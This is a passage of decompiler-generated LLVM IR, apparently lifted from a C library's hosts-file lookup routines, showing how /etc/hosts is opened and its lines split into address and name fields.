  %v4_1b508 = zext i8 %v3_1b508 to i32
  %v0_1b50c = load i32, i32* @r4, align 4
  %v1_1b50c = add i32 %v0_1b50c, 9
  %v2_1b50c = inttoptr i32 %v1_1b50c to i8*
  %v3_1b50c = load i8, i8* %v2_1b50c, align 1
  %v4_1b50c = zext i8 %v3_1b50c to i32
  %v1_1b510 = add i32 %v0_1b50c, 10
  store i32 %v1_1b510, i32* %r0.global-to-local, align 4
  %v4_1b514 = mul nuw nsw i32 %v4_1b508, 256
  %v5_1b514 = or i32 %v4_1b50c, %v4_1b514
  store i32 %v5_1b514, i32* %r3.global-to-local, align 4
  %v0_1b518 = load i32, i32* %r8.global-to-local, align 4
  %v1_1b518 = add i32 %v0_1b518, 10
  %v0_1b51c = load i32, i32* @r5, align 4
  %v1_1b520 = add nuw nsw i32 %v5_1b514, 10
  store i32 %v1_1b520, i32* %r1.global-to-local, align 4
  %v1_1b524 = load i32, i32* @r6, align 4
  %v2_1b524 = add i32 %v1_1b524, 24
  %v3_1b524 = inttoptr i32 %v2_1b524 to i32*
  store i32 %v1_1b518, i32* %v3_1b524, align 4
  %v0_1b528 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b528 = load i32, i32* @r6, align 4
  %v2_1b528 = add i32 %v1_1b528, 20
  %v3_1b528 = inttoptr i32 %v2_1b528 to i32*
  store i32 %v0_1b528, i32* %v3_1b528, align 4
  %v0_1b52c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b52c = load i32, i32* @r6, align 4
  %v2_1b52c = add i32 %v1_1b52c, 16
  %v3_1b52c = inttoptr i32 %v2_1b52c to i32*
  store i32 %v0_1b52c, i32* %v3_1b52c, align 4
  %v0_1b530 = load i32, i32* @r7, align 4
  %v1_1b530 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b530 = add i32 %v1_1b530, %v0_1b530
  %v5_1b534 = icmp slt i32 %v0_1b51c, %v5_1b514
  %.v2_1b530 = select i1 %v5_1b534, i32 -1, i32 %v2_1b530
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_1b4b4, %entry
  %v0_1b538 = phi i32 [ %.v2_1b530, %dec_label_pc_1b4b4 ], [ %v1_1b4a0, %bb ], [ %v0_1b488, %entry ]
  store i32 %v0_1b538, i32* %r0.global-to-local, align 4
  store i32 %v3_1b468, i32* @r4, align 4
  store i32 %v6_1b468, i32* @r5, align 4
  store i32 %v9_1b468, i32* @r6, align 4
  store i32 %v12_1b468, i32* @r7, align 4
  store i32 %v21_1b468, i32* @sl, align 4
  ret i32 %v0_1b538

; uselistorder directives
  uselistorder i32 %v0_1b538, { 1, 0 }
  uselistorder i32 %v5_1b514, { 1, 0, 2 }
  uselistorder i32 %v3_1b4f0, { 1, 0 }
  uselistorder i32 %v1_1b4a0, { 0, 2, 1 }
  uselistorder i32 %v0_1b488, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 5, { 3, 25, 26, 27, 15, 9, 6, 16, 17, 10, 18, 7, 0, 1, 8, 2, 28, 29, 11, 4, 5, 19, 20, 21, 12, 14, 13, 22, 23, 24 }
  uselistorder i32 -10, { 3, 4, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22fec.1595 to i32), i32* @r1, align 4
  %v0_1b548 = load i32, i32* @lr, align 4
  store i32 %v0_1b548, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_23050.1678 to i32), i32* @r0, align 4
  %v3_1b550 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_23050.1678 to i32), i32 ptrtoint (i32* @global_var_22fec.1595 to i32))
  %v2_1b554 = icmp eq i32 %v3_1b550, 0
  store i32 ptrtoint (i32* @global_var_22fec.1595 to i32), i32* @r1, align 4
  br i1 %v2_1b554, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_1b550

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_2305c.1680 to i32), i32* @r0, align 4
  %v2_1b564 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1b564, i32* @lr, align 4
  %v3_1b568 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_2305c.1680 to i32), i32 ptrtoint (i32* @global_var_22fec.1595 to i32))
  ret i32 %v3_1b568

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22fec.1595 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_1b578 = load i32, i32* @r4, align 4
  %v6_1b578 = load i32, i32* @r5, align 4
  %v12_1b578 = load i32, i32* @r7, align 4
  %v15_1b578 = load i32, i32* @r8, align 4
  %v21_1b578 = load i32, i32* @sl, align 4
  %v24_1b578 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_1b584 = sub i32 0, %tmp61
  %v1_1b588 = urem i32 %v1_1b584, 4
  store i32 %v1_1b588, i32* %ip.global-to-local, align 4
  %v2_1b588 = icmp eq i32 %v1_1b588, 0
  %v0_1b58c = load i32, i32* @r2, align 4
  %v0_1b590 = load i32, i32* @r0, align 4
  %v0_1b594 = load i32, i32* @r1, align 4
  %v0_1b598 = load i32, i32* @r3, align 4
  store i32 %v0_1b598, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_1b588, label %dec_label_pc_1b5b8, label %dec_label_pc_1b5a8

dec_label_pc_1b5a8:                               ; preds = %entry
  %v2_1b5a8 = sub i32 %tmp57, %v1_1b588
  %v3_1b5a8 = icmp ult i32 %tmp57, %v1_1b588
  br i1 %v3_1b5a8, label %dec_label_pc_1b88c, label %dec_label_pc_1b5b0

dec_label_pc_1b5b0:                               ; preds = %dec_label_pc_1b5a8
  store i32 %v2_1b5a8, i32* %r2.global-to-local, align 4
  %v2_1b5b4 = add i32 %v1_1b588, %tmp61
  store i32 %v2_1b5b4, i32* @r4, align 4
  br label %dec_label_pc_1b5b8

dec_label_pc_1b5b8:                               ; preds = %entry, %dec_label_pc_1b5b0
  %v0_1b5c8 = phi i32 [ %tmp61, %entry ], [ %v2_1b5b4, %dec_label_pc_1b5b0 ]
  %v0_1b5cc = phi i32 [ %tmp57, %entry ], [ %v2_1b5a8, %dec_label_pc_1b5b0 ]
  %tmp = icmp ult i32 %v0_1b5cc, 32
  br i1 %tmp, label %dec_label_pc_1b88c, label %dec_label_pc_1b5c0

dec_label_pc_1b5c0:                               ; preds = %dec_label_pc_1b5b8
  store i32 %v0_1b598, i32* %r0.global-to-local, align 4
  %v7_1b5c4 = icmp eq i32 %v0_1b598, 1
  %v1_1b5c8 = add i32 %v0_1b5c8, 32
  store i32 %v1_1b5c8, i32* @fp, align 4
  %v1_1b5cc = add i32 %v0_1b5cc, -32
  store i32 %v1_1b5cc, i32* @r8, align 4
  br i1 %v7_1b5c4, label %dec_label_pc_1b6f8, label %dec_label_pc_1b5d4

dec_label_pc_1b5d4:                               ; preds = %dec_label_pc_1b5c0
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1b5e0 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_1b5e0, align 4
  %tmp80 = icmp ult i32 %v1_1b5cc, 4
  br i1 %tmp80, label %dec_label_pc_1b88c, label %dec_label_pc_1b5e8

dec_label_pc_1b5e8:                               ; preds = %dec_label_pc_1b5d4
  %v0_1b5e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b5e8 = add i32 %v0_1b5e8, -36
  store i32 %v1_1b5e8, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_1b5e8, 8
  br i1 %tmp81, label %dec_label_pc_1b88c, label %dec_label_pc_1b5f4

dec_label_pc_1b5f4:                               ; preds = %dec_label_pc_1b5e8
  %v0_1b5f4 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_1b5f4, 16
  br i1 %tmp82, label %dec_label_pc_1b88c, label %dec_label_pc_1b5fc

dec_label_pc_1b5fc:                               ; preds = %dec_label_pc_1b5f4
  %v1_1b5fc = add i32 %v0_1b5e8, -48
  store i32 %v1_1b5fc, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1b5fc, 8
  br i1 %tmp83, label %dec_label_pc_1b88c, label %dec_label_pc_1b608

dec_label_pc_1b608:                               ; preds = %dec_label_pc_1b5fc
  %v1_1b608 = add i32 %v0_1b5e8, -44
  store i32 %v1_1b608, i32* @r8, align 4
  %v1_1b60c = add i32 %v0_1b5e8, -56
  store i32 %v1_1b60c, i32* %r3.global-to-local, align 4
  %v3_1b610 = icmp ult i32 %v1_1b60c, %v1_1b608
  br i1 %v3_1b610, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1b608
  %v1_1b618 = load i32, i32* @r4, align 4
  %v2_1b618 = add i32 %v1_1b618, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_1b608
  store i32 %v1_1b60c, i32* @r8, align 4
  %v1_1b61c.pre = load i32, i32* @r4, align 4
  %v2_1b61c = add i32 %v1_1b61c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1b61c, %.thread1 ], [ %v2_1b618, %bb ]
  %v0_1b624 = phi i32 [ %v1_1b61c.pre, %.thread1 ], [ %v1_1b618, %bb ]
  %v0_1b620 = phi i32 [ %v1_1b60c, %.thread1 ], [ %v1_1b608, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_1b624 = add i32 %v0_1b624, 36
  store i32 %v1_1b624, i32* @r6, align 4
  %v1_1b628 = add i32 %v0_1b624, 48
  store i32 %v1_1b628, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_1b620, 80
  br i1 %tmp84, label %dec_label_pc_1b88c, label %dec_label_pc_1b630

dec_label_pc_1b630:                               ; preds = %bb74
  %v0_1b630 = call i32 @__open_etc_hosts()
  store i32 %v0_1b630, i32* %r0.global-to-local, align 4
  %v2_1b634 = icmp eq i32 %v0_1b630, 0
  br i1 %v2_1b634, label %dec_label_pc_1b650, label %.thread

.thread:                                          ; preds = %dec_label_pc_1b630
  %v1_1b63c = load i32, i32* @fp, align 4
  store i32 %v1_1b63c, i32* @r7, align 4
  %v1_1b640 = load i32, i32* @r5, align 4
  store i32 %v1_1b640, i32* @fp, align 4
  %v1_1b644 = load i32, i32* @r6, align 4
  %v1_1b648 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b704

dec_label_pc_1b650:                               ; preds = %dec_label_pc_1b630
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_1b658 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_1b658, align 4
  %v0_1b65c = call i32 @__errno_location()
  store i32 %v0_1b65c, i32* %r0.global-to-local, align 4
  %v1_1b660 = inttoptr i32 %v0_1b65c to i32*
  %v2_1b660 = load i32, i32* %v1_1b660, align 4
  store i32 %v2_1b660, i32* @sl, align 4
  br label %dec_label_pc_1b890

dec_label_pc_1b668:                               ; preds = %dec_label_pc_1b818
  %v0_1b668 = load i32, i32* @r4, align 4
  %v1_1b668 = add i32 %v0_1b668, 4
  %v2_1b668 = inttoptr i32 %v1_1b668 to i32*
  %v3_1b668 = load i32, i32* %v2_1b668, align 4
  %v1_1b66c = load i32, i32* @sb, align 4
  %v2_1b66c = inttoptr i32 %v1_1b66c to i32*
  store i32 %v3_1b668, i32* %v2_1b66c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b680 = load i32, i32* @r4, align 4
  %v1_1b680 = add i32 %v0_1b680, 8
  store i32 %v1_1b680, i32* %r1.global-to-local, align 4
  %v1_1b684 = load i32, i32* @sb, align 4
  %v2_1b684 = add i32 %v1_1b684, 8
  %v3_1b684 = inttoptr i32 %v2_1b684 to i32*
  store i32 2, i32* %v3_1b684, align 4
  %v0_1b688 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b688, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1b690 = load i32, i32* @sb, align 4
  %v1_1b690 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b690 = inttoptr i32 %v1_1b690 to i32*
  store i32 %v0_1b690, i32* %v2_1b690, align 4
  %v0_1b694 = load i32, i32* @r7, align 4
  %v1_1b694 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b694 = inttoptr i32 %v1_1b694 to i32*
  store i32 %v0_1b694, i32* %v2_1b694, align 4
  %v0_1b698 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b698 = load i32, i32* @sb, align 4
  %v2_1b698 = add i32 %v1_1b698, 12
  %v3_1b698 = inttoptr i32 %v2_1b698 to i32*
  store i32 %v0_1b698, i32* %v3_1b698, align 4
  %v0_1b69c = load i32, i32* %r0.global-to-local, align 4
  %v1_1b69c = load i32, i32* @sb, align 4
  %v2_1b69c = add i32 %v1_1b69c, 16
  %v3_1b69c = inttoptr i32 %v2_1b69c to i32*
  store i32 %v0_1b69c, i32* %v3_1b69c, align 4
  %v0_1b6a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b6a0 = load i32, i32* @sb, align 4
  %v2_1b6a0 = add i32 %v1_1b6a0, 4
  %v3_1b6a0 = inttoptr i32 %v2_1b6a0 to i32*
  store i32 %v0_1b6a0, i32* %v3_1b6a0, align 4
  %v0_1b6a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b6a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b6a4 = add i32 %v1_1b6a4, 4
  %v3_1b6a4 = inttoptr i32 %v2_1b6a4 to i32*
  store i32 %v0_1b6a4, i32* %v3_1b6a4, align 4
  br label %dec_label_pc_1b874

dec_label_pc_1b6ac:                               ; preds = %dec_label_pc_1b840
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b6b0 = load i32, i32* @r4, align 4
  %v1_1b6b0 = add i32 %v0_1b6b0, 4
  %v2_1b6b0 = inttoptr i32 %v1_1b6b0 to i32*
  %v3_1b6b0 = load i32, i32* %v2_1b6b0, align 4
  store i32 %v3_1b6b0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_1b6b8 = load i32, i32* @sb, align 4
  %v2_1b6b8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_1b6b8, i32* %v2_1b6b8, align 4
  store i32 %v0_1b710, i32* %ip.global-to-local, align 4
  %v0_1b6c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b6c0 = load i32, i32* @sb, align 4
  %v2_1b6c0 = inttoptr i32 %v1_1b6c0 to i32*
  store i32 %v0_1b6c0, i32* %v2_1b6c0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1b6cc = load i32, i32* %ip.global-to-local, align 4
  %v1_1b6cc = load i32, i32* %r0.global-to-local, align 4
  %v2_1b6cc = inttoptr i32 %v1_1b6cc to i32*
  store i32 %v0_1b6cc, i32* %v2_1b6cc, align 4
  %v0_1b6d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b6d0 = load i32, i32* @sb, align 4
  %v2_1b6d0 = add i32 %v1_1b6d0, 12
  %v3_1b6d0 = inttoptr i32 %v2_1b6d0 to i32*
  store i32 %v0_1b6d0, i32* %v3_1b6d0, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1b6dc = load i32, i32* @r4, align 4
  %v1_1b6dc = add i32 %v0_1b6dc, 8
  store i32 %v1_1b6dc, i32* %r1.global-to-local, align 4
  %v0_1b6e0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b6e0, i32* @sl, align 4
  %v1_1b6e4 = load i32, i32* @sb, align 4
  %v2_1b6e4 = add i32 %v1_1b6e4, 8
  %v3_1b6e4 = inttoptr i32 %v2_1b6e4 to i32*
  store i32 10, i32* %v3_1b6e4, align 4
  %v0_1b6e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b6e8 = load i32, i32* @sb, align 4
  %v2_1b6e8 = add i32 %v1_1b6e8, 16
  %v3_1b6e8 = inttoptr i32 %v2_1b6e8 to i32*
  store i32 %v0_1b6e8, i32* %v3_1b6e8, align 4
  %v0_1b6ec = load i32, i32* %r1.global-to-local, align 4
  %v1_1b6ec = load i32, i32* @sb, align 4
  %v2_1b6ec = add i32 %v1_1b6ec, 4
  %v3_1b6ec = inttoptr i32 %v2_1b6ec to i32*
  store i32 %v0_1b6ec, i32* %v3_1b6ec, align 4
  %v0_1b6f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b6f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b6f0 = add i32 %v1_1b6f0, 4
  %v3_1b6f0 = inttoptr i32 %v2_1b6f0 to i32*
  store i32 %v0_1b6f0, i32* %v3_1b6f0, align 4
  br label %dec_label_pc_1b874

dec_label_pc_1b6f8:                               ; preds = %dec_label_pc_1b5c0
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1b704

dec_label_pc_1b704:                               ; preds = %.thread, %dec_label_pc_1b6f8
  %v2_1b714.pre-phi = phi i32* [ %v2_1b5e0, %.thread ], [ %.pre, %dec_label_pc_1b6f8 ]
  %v0_1b710 = phi i32 [ %v1_1b63c, %.thread ], [ 0, %dec_label_pc_1b6f8 ]
  %stack_var_-40.1 = phi i32 [ %v1_1b648, %.thread ], [ 0, %dec_label_pc_1b6f8 ]
  %stack_var_-48.1 = phi i32 [ %v1_1b644, %.thread ], [ 0, %dec_label_pc_1b6f8 ]
  %stack_var_-52.0 = phi i32 [ %v0_1b630, %.thread ], [ %v0_1b590, %dec_label_pc_1b6f8 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1b714.pre-phi, align 4
  %v2_1b7d8 = inttoptr i32 %v0_1b594 to i8*
  %v7_1b810 = icmp eq i32 %v0_1b58c, 2
  %v7_1b838 = icmp eq i32 %v0_1b58c, 10
  br label %dec_label_pc_1b85c

dec_label_pc_1b71c:                               ; preds = %dec_label_pc_1b85c
  %v0_1b71c = load i32, i32* @fp, align 4
  store i32 %v0_1b71c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1b724 = call i32 @__GI_strchr(i32 %v0_1b71c, i32 35)
  store i32 %v2_1b724, i32* %r0.global-to-local, align 4
  %v3_1b728 = icmp eq i32 %v2_1b724, 0
  br i1 %v3_1b728, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1b71c
  %v0_1b73011 = load i32, i32* @fp, align 4
  store i32 %v0_1b73011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1b79c.preheader

bb75:                                             ; preds = %dec_label_pc_1b71c
  %v3_1b724 = inttoptr i32 %v2_1b724 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b730 = load i32, i32* @fp, align 4
  store i32 %v0_1b730, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1b724, align 1
  %v0_1b79c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b79c.preheader

dec_label_pc_1b79c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1b79c30 = phi i32 [ %v0_1b79c30.pre, %bb75 ], [ %v0_1b73011, %.thread10 ]
  %v1_1b79c31 = inttoptr i32 %v0_1b79c30 to i8*
  %v2_1b79c32 = load i8, i8* %v1_1b79c31, align 1
  %v3_1b79c33 = zext i8 %v2_1b79c32 to i32
  store i32 %v3_1b79c33, i32* %r3.global-to-local, align 4
  %v2_1b7a034 = icmp eq i8 %v2_1b79c32, 0
  br i1 %v2_1b7a034, label %dec_label_pc_1b7a8, label %dec_label_pc_1b748.preheader

dec_label_pc_1b740:                               ; preds = %dec_label_pc_1b754
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1b744 = inttoptr i32 %v8_1b76c to i8*
  store i8 0, i8* %v3_1b744, align 1
  %v4_1b744 = load i32, i32* %r2.global-to-local, align 4
  %v5_1b744 = add i32 %v4_1b744, 1
  store i32 %v5_1b744, i32* %r2.global-to-local, align 4
  %v1_1b748 = inttoptr i32 %v5_1b744 to i8*
  %v2_1b748 = load i8, i8* %v1_1b748, align 1
  %v3_1b748 = zext i8 %v2_1b748 to i32
  store i32 %v3_1b748, i32* %r1.global-to-local, align 4
  %v2_1b74c = icmp eq i8 %v2_1b748, 0
  br i1 %v2_1b74c, label %dec_label_pc_1b7a8, label %dec_label_pc_1b754

dec_label_pc_1b754:                               ; preds = %dec_label_pc_1b748.preheader, %dec_label_pc_1b740
  %v8_1b76c = phi i32 [ %v5_1b744, %dec_label_pc_1b740 ], [ %v0_1b74820, %dec_label_pc_1b748.preheader ]
  %v1_1b75c = phi i32 [ %v3_1b748, %dec_label_pc_1b740 ], [ %v3_1b74823, %dec_label_pc_1b748.preheader ]
  %v2_1b758 = load i32, i32* @global_var_2b254, align 4
  store i32 %v2_1b758, i32* %r3.global-to-local, align 4
  %v3_1b75c = mul nuw nsw i32 %v1_1b75c, 2
  %v4_1b75c = add i32 %v3_1b75c, %v2_1b758
  %v5_1b75c = inttoptr i32 %v4_1b75c to i8*
  %v6_1b75c = load i8, i8* %v5_1b75c, align 1
  %v8_1b75c = zext i8 %v6_1b75c to i32
  store i32 %v8_1b75c, i32* %r3.global-to-local, align 4
  %v1_1b760 = and i32 %v8_1b75c, 32
  %v2_1b760 = icmp eq i32 %v1_1b760, 0
  br i1 %v2_1b760, label %dec_label_pc_1b768, label %dec_label_pc_1b740

dec_label_pc_1b768:                               ; preds = %dec_label_pc_1b754
  %v0_1b768 = load i32, i32* @r6, align 4
  %v7_1b76c = icmp slt i32 %v0_1b768, 7
  br i1 %v7_1b76c, label %bb76, label %dec_label_pc_1b77c.preheader

bb76:                                             ; preds = %dec_label_pc_1b768
  %v9_1b76c = load i32, i32* @r4, align 4
  %v13_1b76c = mul i32 %v0_1b768, 4
  %v14_1b76c = add i32 %v9_1b76c, %v13_1b76c
  %v15_1b76c = inttoptr i32 %v14_1b76c to i32*
  store i32 %v8_1b76c, i32* %v15_1b76c, align 4
  %v8_1b770 = load i32, i32* @r6, align 4
  %v9_1b770 = add i32 %v8_1b770, 1
  store i32 %v9_1b770, i32* @r6, align 4
  %v0_1b77c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b77c.preheader

dec_label_pc_1b77c.preheader:                     ; preds = %bb76, %dec_label_pc_1b768
  %v0_1b77c25 = phi i32 [ %v0_1b77c25.pre, %bb76 ], [ %v8_1b76c, %dec_label_pc_1b768 ]
  %v1_1b77c26 = inttoptr i32 %v0_1b77c25 to i8*
  %v2_1b77c27 = load i8, i8* %v1_1b77c26, align 1
  %v3_1b77c28 = zext i8 %v2_1b77c27 to i32
  store i32 %v3_1b77c28, i32* %r1.global-to-local, align 4
  %v2_1b78029 = icmp eq i8 %v2_1b77c27, 0
  br i1 %v2_1b78029, label %dec_label_pc_1b79c.loopexit, label %dec_label_pc_1b788.lr.ph

dec_label_pc_1b788.lr.ph:                         ; preds = %dec_label_pc_1b77c.preheader
  %v2_1b78c.pre = load i32, i32* @global_var_2b254, align 4
  br label %dec_label_pc_1b788

dec_label_pc_1b778:                               ; preds = %dec_label_pc_1b788
  %v1_1b778 = add i32 %v0_1b778, 1
  store i32 %v1_1b778, i32* %r2.global-to-local, align 4
  %v1_1b77c = inttoptr i32 %v1_1b778 to i8*
  %v2_1b77c = load i8, i8* %v1_1b77c, align 1
  %v3_1b77c = zext i8 %v2_1b77c to i32
  store i32 %v3_1b77c, i32* %r1.global-to-local, align 4
  %v2_1b780 = icmp eq i8 %v2_1b77c, 0
  br i1 %v2_1b780, label %dec_label_pc_1b79c.loopexit, label %dec_label_pc_1b788

dec_label_pc_1b788:                               ; preds = %dec_label_pc_1b788.lr.ph, %dec_label_pc_1b778
  %v0_1b778 = phi i32 [ %v0_1b77c25, %dec_label_pc_1b788.lr.ph ], [ %v1_1b778, %dec_label_pc_1b778 ]
  %v1_1b790 = phi i32 [ %v3_1b77c28, %dec_label_pc_1b788.lr.ph ], [ %v3_1b77c, %dec_label_pc_1b778 ]
  store i32 %v2_1b78c.pre, i32* %r3.global-to-local, align 4
  %v3_1b790 = mul nuw nsw i32 %v1_1b790, 2
  %v4_1b790 = add i32 %v3_1b790, %v2_1b78c.pre
  %v5_1b790 = inttoptr i32 %v4_1b790 to i8*
  %v6_1b790 = load i8, i8* %v5_1b790, align 1
  %v8_1b790 = zext i8 %v6_1b790 to i32
  store i32 %v8_1b790, i32* %r3.global-to-local, align 4
  %v1_1b794 = and i32 %v8_1b790, 32
  %v2_1b794 = icmp eq i32 %v1_1b794, 0
  br i1 %v2_1b794, label %dec_label_pc_1b778, label %dec_label_pc_1b79c.loopexit

dec_label_pc_1b79c.loopexit:                      ; preds = %dec_label_pc_1b788, %dec_label_pc_1b778, %dec_label_pc_1b77c.preheader
  %v0_1b79c = phi i32 [ %v0_1b77c25, %dec_label_pc_1b77c.preheader ], [ %v0_1b778, %dec_label_pc_1b788 ], [ %v1_1b778, %dec_label_pc_1b778 ]
  %v1_1b79c = inttoptr i32 %v0_1b79c to i8*
  %v2_1b79c = load i8, i8* %v1_1b79c, align 1
  %v3_1b79c = zext i8 %v2_1b79c to i32
  store i32 %v3_1b79c, i32* %r3.global-to-local, align 4
  %v2_1b7a0 = icmp eq i8 %v2_1b79c, 0
  br i1 %v2_1b7a0, label %dec_label_pc_1b7a8, label %dec_label_pc_1b748.preheader

dec_label_pc_1b748.preheader:                     ; preds = %dec_label_pc_1b79c.preheader, %dec_label_pc_1b79c.loopexit
  %v0_1b74820 = phi i32 [ %v0_1b79c, %dec_label_pc_1b79c.loopexit ], [ %v0_1b79c30, %dec_label_pc_1b79c.preheader ]
  %v1_1b74821 = inttoptr i32 %v0_1b74820 to i8*
  %v2_1b74822 = load i8, i8* %v1_1b74821, align 1
  %v3_1b74823 = zext i8 %v2_1b74822 to i32
  store i32 %v3_1b74823, i32* %r1.global-to-local, align 4
  %v2_1b74c24 = icmp eq i8 %v2_1b74822, 0
  br i1 %v2_1b74c24, label %dec_label_pc_1b7a8, label %dec_label_pc_1b754

dec_label_pc_1b7a8:                               ; preds = %dec_label_pc_1b79c.loopexit, %dec_label_pc_1b748.preheader, %dec_label_pc_1b740, %dec_label_pc_1b79c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b7ac = load i32, i32* @r6, align 4
  %v1_1b7b0 = load i32, i32* @r4, align 4
  %v5_1b7b0 = mul i32 %v0_1b7ac, 4
  %v6_1b7b0 = add i32 %v1_1b7b0, %v5_1b7b0
  %v7_1b7b0 = inttoptr i32 %v6_1b7b0 to i32*
  store i32 0, i32* %v7_1b7b0, align 4
  %v7_1b7b4 = icmp sgt i32 %v0_1b7ac, 1
  br i1 %v7_1b7b4, label %dec_label_pc_1b7b8, label %dec_label_pc_1b85c

dec_label_pc_1b7b8:                               ; preds = %dec_label_pc_1b7a8
  %v2_1b7b8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b7b8, i32* %r0.global-to-local, align 4
  %v7_1b7bc = icmp eq i32 %v2_1b7b8, 1
  br i1 %v7_1b7bc, label %dec_label_pc_1b890, label %dec_label_pc_1b7c4

dec_label_pc_1b7c4:                               ; preds = %dec_label_pc_1b7b8
  %v7_1b7c4 = icmp eq i32 %v2_1b7b8, 2
  br i1 %v7_1b7c4, label %dec_label_pc_1b7d0, label %dec_label_pc_1b7fc.preheader

dec_label_pc_1b7fc.preheader:                     ; preds = %dec_label_pc_1b7c4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1b7fc

dec_label_pc_1b7d0:                               ; preds = %dec_label_pc_1b7c4
  store i32 %v0_1b594, i32* %r0.global-to-local, align 4
  %v0_1b7d4 = load i32, i32* @r4, align 4
  %v1_1b7d4 = inttoptr i32 %v0_1b7d4 to i32*
  %v2_1b7d4 = load i32, i32* %v1_1b7d4, align 4
  store i32 %v2_1b7d4, i32* @r1, align 4
  %v3_1b7d8 = call i32 @__GI_strcoll(i8* %v2_1b7d8, i32 %v2_1b7d4)
  store i32 %v3_1b7d8, i32* %r0.global-to-local, align 4
  %v2_1b7dc = icmp eq i32 %v3_1b7d8, 0
